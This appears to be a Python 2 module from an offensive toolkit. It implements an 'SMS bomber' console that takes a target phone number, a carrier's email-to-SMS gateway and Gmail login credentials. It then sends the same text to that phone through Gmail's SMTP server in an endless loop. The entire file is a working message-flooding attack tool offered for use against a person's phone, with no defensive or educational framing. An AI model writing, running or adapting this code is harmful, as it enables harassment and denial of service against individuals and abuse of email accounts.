from core import *

def smsbomb_exec(phone, attack, email, password):
    obj = smtplib.SMTP("smtp.gmail.com:587")
    obj.starttls()
    obj.login(email, password)
    message = raw_input(LC + "[>] Message: " + W )
    target = str(phone) + str(attack)
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (email, "" .join(target), "" .join(message)))
    while True:
         obj.sendmail(email, target, phone_message)
         print G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + W

class SMTP(object):
    def __init__(self, command):
        self.command = command
    
    def smsbomb(self):
        while True:
            command = raw_input(LP + "[smtp] smsbomb >> " + W)    
            try:
                tokenized = command.split(" ")
                if tokenized[0] == "target":
                    phone = tokenized[1]
                    print "Phone => ", phone
                    continue
                elif tokenized[0] == "carrier":
                    carrier = tokenized[1]
                    print "Carrier => ", carrier
                    # Hmm.. lambda calculus?
                    if carrier == "1":
                        attack = "@message.alltel.com"
                    elif carrier == "2":
                        attack = "@txt.att.net"
                    elif carrier == "3":
                        attack = "@myboostmobile.com"
                    elif carrier == "4":
                        attack = "@mobile.celloneusa.com"
                    elif carrier == "5":
                        attack = "@sms.edgewireless.com"
                    elif carrier == "6":
                        attack = "@mymetropcs.com"
                    elif carrier == "7":
                        attack == "@messaging.sprintpcs.com"
                    elif carrier == "8":
                        attack = "@tmomail.net"
                    elif carrier == "9":
                        attack = "@vtext.com"
                    elif carrier == "10":
                        attack = "@vmobl.com"
                    else:
                        print LO + "[!] If cellular provider was not provided, specify gateway by manually searching it up [!]" + W
                        print "Carrier => ", attack
                        continue
                elif tokenized[0] == "email":
                    email = tokenized[1]
                    password = getpass(LC +"[>] What is the password? " + W )
                    try:
                        obj = smtplib.SMTP("smtp.gmail.com:587")
                        obj.starttls()
                        obj.login(email, password)
                    except smtplib.SMTPAuthenticationError:
                        print R + "[!] Credentials not valid! Try again! [!]"
                        continue
                    print "Email => ", email
                    continue
                elif tokenized[0] == "start":
                    print "Phone =>", phone, "\nEmail =>", email, "\nCarrier =>", carrier
                    confirm = raw_input(LC + "[?] Is the information valid? (y/n) " + W)
                    if (confirm == "y") or (confirm == "yes"):
                        smsbomb_exec(phone, attack, email, password)
                    continue
                elif tokenized[0] == "list":
                    print LB + "(1) Alltel\n(2) AT&T\n(3) Boost Mobile\n(4) Cellular One\n(5) Edge Wireless\n(6) Metro PCS\n(7) Sprint"
                    print "(8) T-mobile\n(9) Verizon\n(10) Virgin Mobile" + W
                    continue
                elif tokenized[0] == "exit":
                    break
            except ValueError:
                print WARNING
                continue
            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                break
            except UnboundLocalError:
                print R + "[!] Parameters were not set before execution! [!]" + W
                continue
                
    
    def execute(self):
        if self.command == "smsbomb":
            print_command_help(smsbomb_menu)
            self.smsbomb()